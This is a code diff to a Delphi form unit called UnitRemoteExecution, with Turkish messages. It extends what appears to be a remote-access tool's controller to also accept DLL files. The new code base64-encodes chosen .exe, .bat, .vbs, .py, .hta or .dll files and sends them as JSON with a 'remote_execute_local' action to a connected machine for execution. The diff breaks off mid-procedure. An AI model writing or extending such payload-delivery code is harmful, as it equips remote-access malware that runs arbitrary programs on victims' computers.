@@ -1,4 +1,4 @@
-﻿unit UnitRemoteExecution;
+unit UnitRemoteExecution;
 
 interface
 
@@ -31,6 +31,8 @@ type
     procedure Button1Click(Sender: TObject);
     procedure Button3Click(Sender: TObject);
     procedure Button2Click(Sender: TObject);
+    procedure Button4Click(Sender: TObject);
+    procedure Button5Click(Sender: TObject);
     procedure FormClose(Sender: TObject; var Action: TCloseAction);
 
   private
@@ -62,7 +64,7 @@ var
   Ext: string;
 begin
   Ext := LowerCase(ExtractFileExt(AFileName));
-  Result := (Ext = '.exe') or (Ext = '.bat') or (Ext = '.vbs') or (Ext = '.py') or (Ext = '.hta');
+  Result := (Ext = '.exe') or (Ext = '.bat') or (Ext = '.vbs') or (Ext = '.py') or (Ext = '.hta') or (Ext = '.dll');
 end;
 
 function TForm11.GetBase64FileContent(const AFilePath: string): string;
@@ -102,6 +104,8 @@ begin
   Button1.OnClick := Button1Click;
   Button2.OnClick := Button2Click;
   Button3.OnClick := Button3Click;
+  Button4.OnClick := Button4Click;
+  Button5.OnClick := Button5Click;
 end;
 
 procedure TForm11.DetachCallbacks;
@@ -139,7 +143,7 @@ begin
 
   if not IsAllowedExtension(CleanURL) then
   begin
-    MessageBox(Handle, 'Sadece .exe, .bat, .vbs, .py ve .hta dosya türleri desteklenir.', 'Hata', MB_OK or MB_ICONERROR);
+    MessageBox(Handle, 'Sadece .exe, .bat, .vbs, .py, .hta ve .dll dosya türleri desteklenir.', 'Hata', MB_OK or MB_ICONERROR);
     Exit;
   end;
 
@@ -197,6 +201,73 @@ begin
   if not IsAllowedExtension(FileName) then
   begin
     MessageBox(Handle, 'Sadece .exe, .bat, .vbs, .py ve .hta dosya türleri desteklenir.', 'Hata', MB_OK or MB_ICONERROR);
+    Exit;
+  end;
+
+  Content64 := GetBase64FileContent(FilePath);
+  if Content64 = '' then
+  begin
+    MessageBox(Handle, 'Dosya okunamadı veya boş.', 'Hata', MB_OK or MB_ICONERROR);
+    Exit;
+  end;
+
+  if Assigned(FSendJSON) and Assigned(FLine) then
+  begin
+    JSONObj := TJSONObject.Create;
+    try
+      JSONObj.AddPair('action', 'remote_execute_local');
+      JSONObj.AddPair('filename', FileName);
+      JSONObj.AddPair('content', Content64);
+      FSendJSON(FLine, JSONObj);
+    finally
+      JSONObj.Free;
+    end;
+  end;
+end;
+
+procedure TForm11.Button4Click(Sender: TObject);
+var
+  DLLOpenDialog: TOpenDialog;
+begin
+  DLLOpenDialog := TOpenDialog.Create(Self);
+  try
+    DLLOpenDialog.Filter := 'DLL Files (*.dll)|*.dll';
+    if DLLOpenDialog.Execute then
+    begin
+      if LowerCase(ExtractFileExt(DLLOpenDialog.FileName)) = '.dll' then
+        Edit3.Text := DLLOpenDialog.FileName
+      else
+        MessageBox(Handle, 'Sadece .dll dosya türü seçilebilir.', 'Hata', MB_OK or MB_ICONERROR);
+    end;
+  finally
+    DLLOpenDialog.Free;
+  end;
+end;
+
+procedure TForm11.Button5Click(Sender: TObject);
+var
+  FilePath: string;
+  FileName: string;
+  Content64: string;
+  JSONObj: TJSONObject;
+begin
+  FilePath := Trim(Edit3.Text);
+  if FilePath = '' then
+  begin
+    MessageBox(Handle, 'Lütfen önce bir DLL dosyası seçin.', 'Hata', MB_OK or MB_ICONERROR);
+    Exit;
+  end;
+
+  if not FileExists(FilePath) then
+  begin
+    MessageBox(Handle, 'Belirtilen dosya bulunamadı.', 'Hata', MB_OK or MB_ICONERROR);
+    Exit;
+  end;
+
+  FileName := ExtractFileName(FilePath);
+  if LowerCase(ExtractFileExt(FileName)) <> '.dll' then
+  begin
+    MessageBox(Handle, 'Sadece .dll dosya türü desteklenir.', 'Hata', MB_OK or MB_ICONERROR);
     Exit;
   end;
 
